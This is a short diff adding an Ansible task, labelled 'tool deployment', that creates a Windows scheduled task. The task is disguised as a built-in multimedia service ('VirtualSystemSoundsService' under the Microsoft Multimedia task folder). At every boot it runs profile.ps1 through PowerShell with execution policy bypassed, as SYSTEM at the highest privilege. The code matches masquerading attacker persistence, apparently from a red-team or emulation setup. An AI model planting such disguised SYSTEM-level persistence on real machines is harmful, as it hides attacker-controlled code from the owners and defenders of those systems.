@@ -1,0 +1,14 @@
+---
+- name: Create a new scheduled task for tool deployment
+  community.windows.win_scheduled_task:
+    name: VirtualSystemSoundsService
+    path: \Microsoft\Windows\Multimedia\
+    description: "Virtual System Sounds User Mode Agent"
+    actions:
+    - path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      arguments: -ExecutionPolicy Bypass -NonInteractive -File profile.ps1
+    triggers:
+    - type: boot
+    username: NT Authority\SYSTEM
+    run_level: highest
+    state: present
